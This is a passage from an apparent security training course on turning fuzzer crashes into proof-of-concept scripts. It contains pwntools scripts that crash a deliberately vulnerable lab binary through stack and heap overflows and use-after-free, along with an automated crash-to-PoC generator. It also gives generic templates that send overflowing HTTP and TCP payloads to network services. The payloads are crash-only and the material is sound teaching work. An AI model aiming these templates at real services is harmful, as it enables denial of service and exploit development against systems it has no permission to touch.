    log.info("=" * 60)
    log.info("Stack Buffer Overflow PoC - vulnerable_suite.c")
    log.info("=" * 60)

    # Change to lab directory
    os.chdir(os.path.expanduser("~/crash_analysis_lab"))

    if not os.path.exists(TARGET):
        log.error(f"Target not found: {TARGET}")
        log.info("Build with: gcc -g -fno-stack-protector -no-pie -z execstack src/vulnerable_suite.c -o vuln_no_protect")
        return 1

    import argparse
    parser = argparse.ArgumentParser(description="Stack Overflow PoC")
    parser.add_argument("--verify-rip", action="store_true", help="Verify RIP control")
    parser.add_argument("--test", action="store_true", help="Test reliability")
    parser.add_argument("--size", type=int, default=200, help="Payload size")
    args = parser.parse_args()

    if args.verify_rip:
        verify_rip_control()
    elif args.test:
        if test_reliability():
            log.success("PoC is reliable!")
        else:
            log.warning("PoC may be unreliable")
    else:
        payload = create_payload(size=args.size)
        test_crash(payload)

    return 0

if __name__ == "__main__":
    sys.exit(main())
```

**Running the PoC**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Save the script
cat > poc_stack_overflow.py << 'EOF'
# (paste script above)
EOF

# Basic crash test
python3 poc_stack_overflow.py

# Test reliability
python3 poc_stack_overflow.py --test

# Verify RIP control
python3 poc_stack_overflow.py --verify-rip
```

### Automated Crash-to-PoC Pipeline

**Complete Automation Script**:

```python
#!/usr/bin/env python3
"""
Automated Crash-to-PoC Pipeline for vulnerable_suite.c

Takes a crash input, minimizes it, analyzes it, and generates a PoC script.

Usage:
    cd ~/crash_analysis_lab
    source .venv/bin/activate
    python3 crash_to_poc.py crashes/stack_150.txt --test-case 1
"""

import subprocess
import os
import sys
from pathlib import Path

# Lab configuration
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET_NO_PROTECT = os.path.join(LAB_DIR, "vuln_no_protect")
TARGET_ASAN = os.path.join(LAB_DIR, "vuln_asan")
TARGET_AFL = os.path.join(LAB_DIR, "vuln_afl")

def minimize_crash(crash_file, test_case, output_file):
    """Minimize crash input using binary search

    Note: afl-tmin uses @@ which passes a filename, but vulnerable_suite
    expects CLI arguments. We use a Python-based minimizer instead.
    """

    print(f"[+] Minimizing {crash_file}...")

    # Read crash payload
    with open(crash_file, 'rb') as f:
        payload = f.read().decode('latin-1', errors='ignore').strip()

    def crashes_with_payload(p):
        """Test if payload crashes the target"""
        try:
            result = subprocess.run(
                [TARGET_ASAN, test_case, p],
                capture_output=True, timeout=5
            )
            # ASAN returns non-zero on crash
            return result.returncode != 0
        except subprocess.TimeoutExpired:
            return False

    # Check if original crashes
    if not crashes_with_payload(payload):
        print(f"[-] Original payload doesn't crash, copying as-is")
        import shutil
        shutil.copy(crash_file, output_file)
        return True

    orig_size = len(payload)

    # Binary search for minimum size
    low, high = 1, len(payload)
    while low < high:
        mid = (low + high) // 2
        if crashes_with_payload(payload[:mid]):
            high = mid
        else:
            low = mid + 1

    minimized = payload[:low]

    with open(output_file, 'w') as f:
        f.write(minimized)

    reduction = ((orig_size - len(minimized)) / orig_size) * 100
    print(f"[+] Minimized: {orig_size} → {len(minimized)} bytes ({reduction:.1f}% reduction)")
    return True

def analyze_crash(crash_file, test_case):
    """Analyze crash with ASAN build

    Note: Heap overflow (test 2) and UAF (test 3) are SILENT without ASAN!
    Always use the ASAN build for analysis.
    """

    print(f"[+] Analyzing {crash_file} with test case {test_case}...")

    if not os.path.exists(TARGET_ASAN):
        print(f"[-] ASAN binary not found: {TARGET_ASAN}")
        print("[!] Build with: clang -g -fsanitize=address src/vulnerable_suite.c -o vuln_asan")
        return {"type": "Unknown", "asan_output": ""}

    # Read payload from file (handle binary data)
    with open(crash_file, "rb") as f:
        payload = f.read().decode('latin-1', errors='ignore').strip()

    try:
        result = subprocess.run(
            [TARGET_ASAN, test_case, payload],
            capture_output=True,
            text=True,
            timeout=5
        )
    except subprocess.TimeoutExpired:
        print(f"[-] Analysis timed out")
        return {"type": "Timeout", "asan_output": ""}

    asan_output = result.stderr

    # Extract crash type from ASAN output
    if "stack-buffer-overflow" in asan_output:
        crash_type = "Stack Buffer Overflow"
    elif "heap-buffer-overflow" in asan_output:
        crash_type = "Heap Buffer Overflow"
    elif "heap-use-after-free" in asan_output:
        crash_type = "Use-After-Free"
    elif "double-free" in asan_output:
        crash_type = "Double-Free"
    elif "SEGV on unknown address" in asan_output:
        crash_type = "NULL Pointer Dereference"
    else:
        crash_type = "Unknown"

    print(f"[+] Crash type: {crash_type}")

    return {
        "type": crash_type,
        "asan_output": asan_output,
        "test_case": test_case
    }

def generate_poc_script(crash_file, test_case, analysis, output_script):
    """Generate Python PoC script"""

    print(f"[+] Generating PoC script: {output_script}")

    # Read crash payload
    with open(crash_file, "r") as f:
        crash_data = f.read().strip()

    # Determine target based on crash type
    # Heap bugs (heap overflow, UAF) need ASAN to crash reliably
    needs_asan = analysis["type"] in ["Heap Buffer Overflow", "Use-After-Free"]
    target_binary = "vuln_asan" if needs_asan else "vuln_no_protect"
    target_note = "# Note: Using ASAN build - heap bugs are silent without sanitizer!" if needs_asan else ""

    # Generate PoC template
    poc_template = f'''#!/usr/bin/env python3
"""
Proof-of-Concept: {analysis["type"]} in vulnerable_suite.c

Generated automatically by crash-to-poc pipeline
Test Case: {test_case}
"""

from pwn import *
import os
import sys

# Configuration
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "{target_binary}")
TEST_CASE = "{test_case}"
{target_note}

def generate_payload():
    """Generate crash payload"""

    payload = {repr(crash_data)}

    return payload

def test_crash():
    """Test crash reliability"""

    os.chdir(LAB_DIR)

    if not os.path.exists(TARGET):
        log.error(f"Target not found: {{TARGET}}")
        return False

    log.info("Testing PoC...")

    payload = generate_payload()
    p = process([TARGET, TEST_CASE, payload])

    try:
        p.wait(timeout=2)
    except Exception:
        pass

    result = p.returncode
    p.close()

    # Check for crash signals:
    # -11 = SIGSEGV (segmentation fault)
    # -6  = SIGABRT (abort, common with ASAN)
    # Non-zero exit also indicates ASAN detected issue
    if result is not None and result != 0:
        if result < 0:
            signal_names = {{-11: "SIGSEGV", -6: "SIGABRT", -4: "SIGILL", -8: "SIGFPE"}}
            sig_name = signal_names.get(result, f"signal {{-result}}")
            log.success(f"Crash confirmed! ({{sig_name}})")
        else:
            log.success(f"Crash confirmed! (ASAN exit code {{result}})")
        return True
    else:
        log.warning(f"No crash (exit code: {{result}})")
        return False

def test_reliability(attempts=10):
    """Test PoC reliability"""

    log.info(f"Testing reliability ({{attempts}} attempts)")

    crashes = 0
    for i in range(attempts):
        if test_crash():
            crashes += 1

    rate = (crashes / attempts) * 100
    log.info(f"Crash rate: {{crashes}}/{{attempts}} ({{rate:.1f}}%)")

    return rate >= 90

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--test", action="store_true", help="Test reliability")
    args = parser.parse_args()

    if args.test:
        test_reliability()
    else:
        test_crash()
'''

    with open(output_script, "w") as f:
        f.write(poc_template)

    os.chmod(output_script, 0o755)
    print(f"[+] PoC script created: {output_script}")

def process_crash(crash_file, test_case, output_dir):
    """Complete pipeline for one crash"""

    crash_name = Path(crash_file).stem
    output_dir = Path(output_dir)
    output_dir.mkdir(exist_ok=True)

    print("=" * 60)
    print(f"Processing: {crash_name} (test case {test_case})")
    print("=" * 60)

    # Step 1: Minimize
    minimized_file = output_dir / f"{crash_name}_min.txt"
    minimize_crash(crash_file, test_case, str(minimized_file))

    # Step 2: Analyze
    analysis = analyze_crash(str(minimized_file), test_case)
    if not analysis:
        print("[-] Analysis failed")
        return False

    # Step 3: Generate PoC
    poc_script = output_dir / f"{crash_name}_poc.py"
    generate_poc_script(str(minimized_file), test_case, analysis, str(poc_script))

    # Step 4: Test PoC
    print("[+] Testing generated PoC...")
    result = subprocess.run(["python3", str(poc_script)], capture_output=True, text=True)
    print(result.stdout)
    if result.stderr:
        print(result.stderr)

    return True

def main():
    import argparse

    parser = argparse.ArgumentParser(description="Automated Crash-to-PoC Pipeline for vulnerable_suite.c")
    parser.add_argument("crash", help="Crash input file (contains payload)")
    parser.add_argument("--test-case", "-t", default="1", help="Test case number (1-5)")
    parser.add_argument("--output-dir", "-o", default="./pocs", help="Output directory")
    args = parser.parse_args()

    os.chdir(LAB_DIR)

    if not os.path.exists(args.crash):
        print(f"[-] Crash file not found: {args.crash}")
        return 1

    if not os.path.exists(TARGET_NO_PROTECT):
        print(f"[-] Target binary not found: {TARGET_NO_PROTECT}")
        print("[*] Build with: cd ~/crash_analysis_lab/src && gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite.c -o ../vuln_no_protect")
        return 1

    if process_crash(args.crash, args.test_case, args.output_dir):
        print("\n[+] Pipeline complete!")
        return 0
    else:
        print("\n[-] Pipeline failed")
        return 1

if __name__ == "__main__":
    sys.exit(main())
```

**Running the Pipeline**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Create a crash input file
python3 -c "print('A'*200)" > crashes/stack_crash.txt

# Run the pipeline for stack overflow (test case 1)
python3 crash_to_poc.py crashes/stack_crash.txt --test-case 1 --output-dir pocs/

# Expected output:
# ============================================================
# Processing: stack_crash (test case 1)
# ============================================================
# [+] Minimizing crashes/stack_crash.txt...
# [+] Minimized: 200 → 64 bytes (68.0% reduction)
# [+] Analyzing pocs/stack_crash_min.txt with test case 1...
# [+] Crash type: Stack Buffer Overflow
# [+] Generating PoC script: pocs/stack_crash_poc.py
# [+] PoC script created: pocs/stack_crash_poc.py
# [+] Testing generated PoC...
# [+] Crash confirmed! (SIGSEGV)
# [+] Pipeline complete!

# Run for heap overflow (test case 2)
python3 -c "print('B'*100)" > crashes/heap_crash.txt
python3 crash_to_poc.py crashes/heap_crash.txt --test-case 2 --output-dir pocs/

# Expected output:
# [+] Minimized: 100 → 32 bytes (68.0% reduction)
# [+] Crash type: Heap Buffer Overflow
# [+] Crash confirmed! (ASAN exit code 1)  <- Uses ASAN build automatically!

# Check generated PoCs
ls pocs/
# heap_crash_min.txt  heap_crash_poc.py  stack_crash_min.txt  stack_crash_poc.py

# Test stack overflow PoC reliability
python3 pocs/stack_crash_poc.py --test
# [*] Crash rate: 8/10 (80.0%) - some timeouts due to pwntools race condition

# Test heap overflow PoC (uses ASAN automatically)
python3 pocs/heap_crash_poc.py --test
# [*] Testing PoC...
# [+] Crash confirmed! (ASAN exit code 1)
# [*] Crash rate: 8/10 (80.0%)
```

> [!NOTE] **Minimization Results**
>
> - Stack overflow: 200 → **64 bytes** (exact buffer size in `stack_overflow()`)
> - Heap overflow: 100 → **32 bytes** (exact buffer size in `heap_overflow()`)
> - The minimizer finds the exact boundary where overflow occurs!

> [!TIP] **Reliability Note**
> The ~80% crash rate is due to pwntools `process()` timeout/race conditions (shows "Stopped process" with `exit code: None`), not actual unreliability.
> These are deterministic bugs that crash 100% when run directly:
>
> ```bash
> ./vuln_no_protect 1 "$(python3 -c "print('A'*64)")"  # Always SIGSEGV
> ./vuln_asan 2 "$(python3 -c "print('B'*32)")"        # Always ASAN error
> ```

### PoC Development for Network Services

Many real-world vulnerabilities are in network services. The `vuln_http_server` from Day 4 is a good example. These require socket-based PoCs rather than stdin-based.

**Network Service PoC for vuln_http_server** (from Day 4):

```python
#!/usr/bin/env python3
"""
Network Service PoC for vuln_http_server

Target: ~/crash_analysis_lab/vuln_http_server
Port: 8888
Type: Heap Buffer Overflow in HTTP path parsing
"""

from pwn import *
import socket
import time
import os
import subprocess

# Configuration
HOST = "127.0.0.1"
PORT = 8888
TIMEOUT = 5
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "vuln_http_server")

def start_server():
    """Start the vulnerable HTTP server"""

    if not os.path.exists(TARGET):
        log.error(f"Server not found: {TARGET}")
        log.info("Build with: clang -g -O1 -fsanitize=address src/vuln_http_server.c -o vuln_http_server")
        return None

    log.info(f"Starting server on port {PORT}...")
    proc = subprocess.Popen([TARGET], cwd=LAB_DIR,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
    time.sleep(0.5)  # Wait for server to start
    return proc

def create_connection():
    """Establish connection to target service"""
    try:
        conn = remote(HOST, PORT, timeout=TIMEOUT)
        return conn
    except Exception as e:
        log.error(f"Connection failed: {e}")
        return None

def create_payload(path_size=200):
    """Generate exploit payload - overflow in HTTP path"""

    # HTTP GET request with oversized path
    payload = b"GET /"
    payload += b"A" * path_size  # Overflow the 64-byte path buffer
    payload += b" HTTP/1.1\r\n"
    payload += b"Host: localhost\r\n"
    payload += b"\r\n"

    return payload

def exploit():
    """Main exploit function"""

    log.info(f"Connecting to {HOST}:{PORT}")
    conn = create_connection()

    if not conn:
        return False

    # Send payload
    payload = create_payload(path_size=200)
    log.info(f"Sending {len(payload)} byte payload")
    conn.send(payload)

    # Check for crash
    try:
        response = conn.recv(timeout=2)
        log.info(f"Response: {response[:100]}")
    except EOFError:
        log.success("Connection closed - server likely crashed")
        return True
    except:
        log.success("No response - server likely crashed")
        return True

    conn.close()
    return False

def test_reliability(attempts=5):
    """Test exploit reliability"""

    log.info(f"Testing reliability ({attempts} attempts)")

    successes = 0
    for i in range(attempts):
        log.info(f"Attempt {i+1}/{attempts}")

        # Start fresh server for each attempt
        server = start_server()
        if not server:
            continue

        if exploit():
            successes += 1

        # Clean up
        server.terminate()
        time.sleep(0.5)

    rate = (successes / attempts) * 100
    log.info(f"Success rate: {successes}/{attempts} ({rate:.1f}%)")

    return rate >= 80

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="HTTP Server PoC")
    parser.add_argument("--host", default=HOST, help="Target host")
    parser.add_argument("--port", type=int, default=PORT, help="Target port")
    parser.add_argument("--test", action="store_true", help="Test reliability")
    parser.add_argument("--start-server", action="store_true", help="Start server before exploit")
    args = parser.parse_args()

    HOST = args.host
    PORT = args.port

    if args.test:
        test_reliability()
    else:
        if args.start_server:
            server = start_server()
            if server:
                exploit()
                server.terminate()
        else:
            exploit()
```

**Running the HTTP Server PoC**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Make sure server is built
clang -g -O1 -fsanitize=address src/vuln_http_server.c -o vuln_http_server

# Run PoC (starts server automatically)
python3 poc_http_server.py --start-server

# Expected output:
# [*] Starting server on port 8888...
# [*] Connecting to 127.0.0.1:8888
# [+] Opening connection to 127.0.0.1 on port 8888: Done
# [*] Sending 235 byte payload
# [+] Connection closed - server likely crashed

# Test reliability
python3 poc_http_server.py --test

# Expected output:
# [*] Testing reliability (5 attempts)
# [*] Attempt 1/5
# [*] Starting server on port 8888...
# [+] Connection closed - server likely crashed
# ... (repeats for all 5 attempts)
# [*] Success rate: 5/5 (100.0%)
```

**Generic Network Service PoC Template**:

```python
#!/usr/bin/env python3
"""
Network Service Exploit PoC Template

Target: [Service Name] version X.Y.Z
Port: [Port Number]
Protocol: [TCP/UDP]
CVE: [CVE-ID if assigned]
"""

from pwn import *
import socket
import time

# Configuration
HOST = "127.0.0.1"
PORT = 8080
TIMEOUT = 5

def create_connection():
    """Establish connection to target service"""
    try:
        # Option 1: Using pwntools (preferred)
        conn = remote(HOST, PORT, timeout=TIMEOUT)
        return conn
    except Exception as e:
        log.error(f"Connection failed: {e}")
        return None

def create_payload():
    """Generate exploit payload"""

    # Protocol-specific header
    payload = b"GET /"

    # Overflow/exploit data
    payload += b"A" * 200  # Adjust based on analysis

    # Protocol-specific trailer
    payload += b" HTTP/1.1\r\n"
    payload += b"Host: localhost\r\n"
    payload += b"\r\n"

    return payload

def exploit():
    """Main exploit function"""

    log.info(f"Connecting to {HOST}:{PORT}")
    conn = create_connection()

    if not conn:
        return False

    # Wait for banner if needed
    try:
        banner = conn.recvuntil(b"\n", timeout=2)
        log.info(f"Banner: {banner}")
    except:
        pass

    # Send payload
    payload = create_payload()
    log.info(f"Sending {len(payload)} byte payload")
    conn.send(payload)

    # Check for crash or shell
    try:
        response = conn.recv(timeout=2)
        log.info(f"Response: {response[:100]}")
    except EOFError:
        log.success("Connection closed - service likely crashed")
    except:
        pass

    conn.close()
    return True

def test_reliability(attempts=10):
    """Test exploit reliability"""

    log.info(f"Testing reliability ({attempts} attempts)")

    successes = 0
    for i in range(attempts):
        if exploit():
            successes += 1
        time.sleep(0.5)  # Allow service restart

    rate = (successes / attempts) * 100
    log.info(f"Success rate: {successes}/{attempts} ({rate:.1f}%)")

    return rate >= 90

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Network Service PoC")
    parser.add_argument("--host", default=HOST, help="Target host")
    parser.add_argument("--port", type=int, default=PORT, help="Target port")
    parser.add_argument("--test", action="store_true", help="Test reliability")
    args = parser.parse_args()

    HOST = args.host
    PORT = args.port

    if args.test:
        test_reliability()
    else:
        exploit()
```

**HTTP Service PoC Template**:

```python
#!/usr/bin/env python3
"""HTTP Service Vulnerability PoC"""
from pwn import *
import requests

TARGET = "http://127.0.0.1:8080"

def exploit_via_header():
    """Exploit via malicious HTTP header"""

    headers = {
        "Host": "localhost",
        "X-Vulnerable-Header": "A" * 500 + p32(0xdeadbeef).decode('latin-1'),
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = requests.get(f"{TARGET}/vulnerable", headers=headers, timeout=5)
        log.info(f"Response: {response.status_code}")
    except requests.exceptions.ConnectionError:
        log.success("Server crashed!")
    except Exception as e:
        log.error(f"Error: {e}")

def exploit_via_body():
    """Exploit via POST body"""

    payload = b"param=" + b"A" * 1000

    try:
        response = requests.post(
            f"{TARGET}/api/vulnerable",
            data=payload,
            timeout=5
        )
    except requests.exceptions.ConnectionError:
        log.success("Server crashed!")

def exploit_raw_socket():
    """Low-level exploit via raw socket"""

    # For when requests library doesn't work
    # (malformed HTTP, binary protocols, etc.)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 8080))

    # Send malformed HTTP
    payload = b"GET /\x00overflow" + b"A" * 500 + b" HTTP/1.1\r\n\r\n"
    sock.send(payload)

    try:
        response = sock.recv(1024)
    except:
        log.success("Crash triggered")

    sock.close()

if __name__ == "__main__":
    exploit_via_header()
```

**TCP Protocol PoC Template**:

```python
#!/usr/bin/env python3
"""Generic TCP Protocol PoC"""
from pwn import *

def exploit_custom_protocol():
    """Exploit custom TCP protocol"""

    conn = remote("127.0.0.1", 9999)

    # Protocol handshake
    conn.recvuntil(b"READY\n")

    # Send command with overflow
    conn.send(b"AUTH ")
    conn.send(b"A" * 256)  # Overflow
    conn.send(b"\n")

    # Check result
    try:
        response = conn.recvline(timeout=2)
        log.info(f"Response: {response}")
    except EOFError:
        log.success("Crash!")

    conn.close()

if __name__ == "__main__":
    exploit_custom_protocol()
```

### PoC Development for Rust and Go Programs

Modern memory-safe languages still crash—through panics, FFI bugs, or unsafe code blocks. When creating PoCs for Rust or Go targets, the workflow differs from C/C++.

#### Rust Crash Analysis and PoC

**Rust Panic Backtraces**:

```bash
# Enable full backtraces
RUST_BACKTRACE=1 ./rust_program
# Or for more detail:
RUST_BACKTRACE=full ./rust_program

# Example panic output:
# thread 'main' panicked at 'index out of bounds: the len is 3 but the index is 5', src/main.rs:10:5
# stack backtrace:
#    0: rust_begin_unwind
#    1: core::panicking::panic_fmt
#    2: core::panicking::panic_bounds_check
#    3: myprogram::vulnerable_function
#              at ./src/main.rs:10:5
#    4: myprogram::main
#              at ./src/main.rs:25:5
```

**Rust with Sanitizers** (nightly):

```bash
# AddressSanitizer for unsafe code
RUSTFLAGS="-Zsanitizer=address" cargo +nightly build --target x86_64-unknown-linux-gnu
ASAN_OPTIONS=detect_leaks=1 ./target/x86_64-unknown-linux-gnu/debug/program

# ThreadSanitizer
RUSTFLAGS="-Zsanitizer=thread" cargo +nightly build --target x86_64-unknown-linux-gnu

# MemorySanitizer
RUSTFLAGS="-Zsanitizer=memory" cargo +nightly build --target x86_64-unknown-linux-gnu

# Example ASAN output for unsafe Rust:
# ==12345==ERROR: AddressSanitizer: heap-buffer-overflow
#     #0 0x55555 in myprogram::unsafe_function::h1234567890abcdef
#     #1 0x55556 in myprogram::main::h0987654321fedcba
```

**Debugging Rust Crashes**:

```bash
# GDB with Rust support
rust-gdb ./target/debug/program

# LLDB (better Rust support on macOS)
rust-lldb ./target/debug/program

# In debugger:
(gdb) break rust_panic
(gdb) run
# Stops at panic point

# Examine Rust variables
(gdb) info locals
(gdb) print my_vec.len
```

**Analyzing FFI Crashes** (Rust calling C):

```bash
# Common crash: Rust calls C library that corrupts memory
# ASAN helps identify boundary:

# Build C library with ASAN
clang -fsanitize=address -g -c library.c -o library.o

# Build Rust with ASAN
RUSTFLAGS="-Zsanitizer=address -Clink-arg=-fsanitize=address" \
    cargo +nightly build

# Crash report shows which side caused corruption
```

**Rust PoC Template** (for Rust targets with unsafe code):

```python
#!/usr/bin/env python3
"""PoC for Rust program with unsafe code vulnerability"""
from pwn import *
import os

# Adjust path to your Rust binary
TARGET = "./target/release/vulnerable_rust"

def create_rust_poc():
    # Rust programs often use different calling conventions
    # Focus on triggering the unsafe block or FFI boundary

    payload = b""
    payload += b"A" * 128  # Overflow in unsafe block

    return payload

def test_crash():
    if not os.path.exists(TARGET):
        log.error(f"Target not found: {TARGET}")
        return False

    p = process([TARGET])
    p.send(create_rust_poc())

    try:
        p.wait(timeout=2)
    except:
        pass

    if p.returncode and p.returncode < 0:
        log.success("Crash triggered!")
        return True
    return False

if __name__ == "__main__":
    test_crash()
```

#### Go Crash Analysis and PoC

**Go Panic Traces**:

```bash
# Go automatically prints stack traces on panic
./go_program

# Example output:
# panic: runtime error: index out of range [5] with length 3
#
# goroutine 1 [running]:
# main.vulnerableFunction(...)
#         /path/to/main.go:15
# main.main()
#         /path/to/main.go:25 +0x45

# For more detail, set GOTRACEBACK
GOTRACEBACK=all ./go_program      # All goroutines
GOTRACEBACK=crash ./go_program    # Crash with core dump
```

**Go Race Detector** (similar to TSAN):

```bash
# Build with race detector
go build -race -o program_race ./...

# Run - detects data races
./program_race

# Example race detection output:
# ==================
# WARNING: DATA RACE
# Write at 0x00c0000a0000 by goroutine 7:
#   main.worker()
#       /path/to/main.go:20 +0x45
#
# Previous read at 0x00c0000a0000 by goroutine 6:
#   main.worker()
#       /path/to/main.go:18 +0x38
# ==================
```

**Debugging Go with Delve**:

```bash
# Install delve
go install github.com/go-delve/delve/cmd/dlv@latest

# Debug binary
dlv exec ./program

# Or debug test
dlv test ./...

# Common commands:
(dlv) break main.vulnerableFunction
(dlv) continue
(dlv) print variableName
(dlv) goroutines           # List all goroutines
(dlv) goroutine 5         # Switch to goroutine 5
(dlv) stack               # Current goroutine stack
```

**Go CGo Crashes** (Go calling C):

```bash
# CGo crashes can be tricky - Go runtime may obscure C crashes

# Enable CGo debug mode
GODEBUG=cgocheck=2 ./program

# For ASAN with CGo:
CGO_CFLAGS="-fsanitize=address" \
CGO_LDFLAGS="-fsanitize=address" \
go build -o program ./...
```

#### Crash Analysis Comparison

| Aspect                       | Rust                    | Go                      | C/C++                 |
| ---------------------------- | ----------------------- | ----------------------- | --------------------- |
| **Memory bugs in safe code** | Panic (not exploitable) | Panic (not exploitable) | Crash (exploitable)   |
| **Unsafe/CGo crashes**       | ASAN-detectable         | ASAN via CGo            | ASAN native           |
| **Race conditions**          | Compiler prevents most  | Race detector           | TSAN required         |
| **Backtrace quality**        | Excellent (DWARF)       | Good (Go symbols)       | Varies (need symbols) |
| **Debugger**                 | rust-gdb/lldb           | Delve                   | GDB/LLDB              |
| **Core dump analysis**       | Standard tools          | `go tool pprof`         | crash/GDB             |

### Practical Exercise

**Task**: Convert minimized crashes from Day 5 to reliable PoC scripts

**Setup**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Verify binaries exist
ls -la vuln_no_protect vuln_asan

# Create output directory for PoCs
mkdir -p pocs
```

**Step 1: Create Crash Inputs for Each Vulnerability Type**:

```bash
cd ~/crash_analysis_lab

# Stack overflow (test case 1)
python3 -c "print('A'*200)" > crashes/stack_overflow.txt

# Heap overflow (test case 2)
python3 -c "print('B'*100)" > crashes/heap_overflow.txt

# UAF and double-free don't need payload files (triggered by test case number alone)
```

**Step 2: Run Automated Pipeline**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Generate PoC for stack overflow
python3 crash_to_poc.py crashes/stack_overflow.txt --test-case 1 --output-dir pocs/

# Generate PoC for heap overflow
python3 crash_to_poc.py crashes/heap_overflow.txt --test-case 2 --output-dir pocs/

# Check generated files
ls -la pocs/
```

**Step 3: Create Manual PoCs for UAF and Double-Free**:

Since UAF and double-free are triggered by test case number alone (no payload needed), create simple PoCs.

> [!WARNING] **UAF requires ASAN build!**
> The UAF vulnerability (test case 3) does NOT crash with `vuln_no_protect` — the memory is silently corrupted but execution continues.
> Always use `vuln_asan` for reliable UAF detection.

```python
#!/usr/bin/env python3
"""
PoC for Use-After-Free in vulnerable_suite.c (Test Case 3)

IMPORTANT: UAF is SILENT without AddressSanitizer!
Use vuln_asan build for reliable crash.
"""
from pwn import *
import os

LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
# UAF requires ASAN to reliably detect!
TARGET = os.path.join(LAB_DIR, "vuln_asan")

def test_uaf():
    os.chdir(LAB_DIR)
    log.info("Testing UAF (test case 3) with ASAN build...")

    p = process([TARGET, "3"])
    p.wait(timeout=2)

    if p.returncode and p.returncode != 0:
        log.success(f"UAF detected! (exit code {p.returncode})")
        return True
    else:
        log.warning("No crash - verify ASAN build is used")
        return False

if __name__ == "__main__":
    test_uaf()
```

Save as `pocs/uaf_poc.py` and create similar for double-free (test case 4) and NULL deref (test case 5).

**Step 4: Test All PoCs**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

echo "=== Testing all PoCs ==="

for poc in pocs/*_poc.py; do
    echo ""
    echo "Testing $(basename $poc)..."
    python3 $poc || echo "FAILED: $poc"
done
#=== Testing all PoCs ===

#Testing heap_crash_poc.py...
#[*] Testing PoC...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_asan': pid 17008
#[*] Process '/home/dev/crash_analysis_lab/vuln_asan' stopped with exit code 1 (pid 17008)
#[+] Crash confirmed! (ASAN exit code 1)

#Testing heap_overflow_poc.py...
#[*] Testing PoC...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_asan': pid 17015
#[*] Process '/home/dev/crash_analysis_lab/vuln_asan' stopped with exit code 1 (pid 17015)
#[+] Crash confirmed! (ASAN exit code 1)

#Testing stack_crash_poc.py...
#[*] Testing PoC...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_no_protect': pid 17022
#[*] Process '/home/dev/crash_analysis_lab/vuln_no_protect' stopped with exit code -11 (SIGSEGV) (pid #17022)
#[+] Crash confirmed! (SIGSEGV)

#Testing stack_overflow_poc.py...
#[*] Testing PoC...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_no_protect': pid 17027
#[*] Process '/home/dev/crash_analysis_lab/vuln_no_protect' stopped with exit code -11 (SIGSEGV) (pid #17027)
#[+] Crash confirmed! (SIGSEGV)

#Testing uaf_poc.py...
#[*] Testing UAF (test case 3) with ASAN build...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_asan': pid 17032
#[*] Process '/home/dev/crash_analysis_lab/vuln_asan' stopped with exit code 1 (pid 17032)
#[+] UAF detected! (exit code 1)

```

**Step 5: Test PoC Reliability**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Test stack overflow PoC reliability
python3 pocs/stack_overflow_poc.py --test

# Expected output:
# [*] Testing reliability (10 attempts)
# [+] Crash confirmed! (SIGSEGV)
# ... (10 times)
# [*] Crash rate: 10/10 (100.0%)
```

**Expected Results**:

| Vulnerability  | Test Case | PoC File                | Reliability | Notes                     |
| -------------- | --------- | ----------------------- | ----------- | ------------------------- |
| Stack Overflow | 1         | `stack_overflow_poc.py` | 100%        | Crashes with/without ASAN |
| Heap Overflow  | 2         | `heap_overflow_poc.py`  | 100% (ASAN) | **Silent without ASAN!**  |
| Use-After-Free | 3         | `uaf_poc.py`            | 100% (ASAN) | **Silent without ASAN!**  |
| Double-Free    | 4         | `double_free_poc.py`    | 100%        | Crashes with/without ASAN |
| NULL Deref     | 5         | `null_deref_poc.py`     | 100%        | Crashes with/without ASAN |

> [!WARNING] **Critical: ASAN Required for Heap Bugs**
> Heap overflow and UAF vulnerabilities do **not crash** without AddressSanitizer!
> Always test with `vuln_asan` build to detect these bug types.

**Success Criteria**:

- PoC generated for each of the 5 vulnerability types in vulnerable_suite.c
- Each PoC crashes target reliably (use ASAN build for heap overflow and UAF)
- Code is documented with vulnerability type and test case number
- Scripts can be run independently from ~/crash_analysis_lab
- Pipeline runs end-to-end without manual intervention

### Key Takeaways

1. **Reliable PoCs are essential**: Foundation for exploit development and reporting
2. **Automation enables scale**: Manual PoC creation doesn't scale past a few bugs
3. **Testing is critical**: Verify PoC reliability before sharing
4. **Documentation matters**: Clear comments make PoCs useful for others
5. **Python + pwntools is powerful**: Standard toolset for security research
6. **Panics ≠ Vulnerabilities**: Safe Rust/Go panics are DoS at worst
7. **Unsafe code is the attack surface**: Focus analysis on `unsafe` blocks and FFI boundaries
8. **Race conditions matter**: Go's race detector catches what safe code analysis misses
9. **FFI boundaries need ASAN**: Sanitize both sides of language boundaries
10. **Tooling exists**: Use rust-gdb, Delve—don't force C/C++ tools

### Discussion Questions

1. What are the ethical considerations when publishing PoC code?
2. How does PoC reliability (e.g., 10/10 crash rate) affect vulnerability severity assessment?
3. What pwntools features (p32/p64, tubes, ELF parsing) are most useful for PoC development?
4. How can automated crash→minimize→PoC pipelines be integrated into continuous fuzzing workflows?

## Capstone Project - The Crash Analysis Pipeline

- **Goal**: Apply the week's techniques to process a batch of crashes into actionable vulnerability reports and reliable PoCs.
- **Activities**:
